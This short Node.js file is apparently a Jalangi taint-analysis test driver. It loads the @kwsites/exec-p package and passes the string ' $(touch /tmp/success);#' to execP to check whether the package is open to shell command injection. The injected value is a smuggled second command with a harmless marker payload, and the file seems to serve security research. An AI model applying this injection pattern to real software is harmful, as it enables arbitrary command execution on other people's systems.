// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/@kwsites/exec-p/node_modules/@kwsites/exec-p');
try {
	var x0 = {};
var x1 = {};
var x2 = " $(touch /tmp/success);#";
new PUT["execP"](x0,x1,x2)();
} catch (e) {
	console.log(e);
}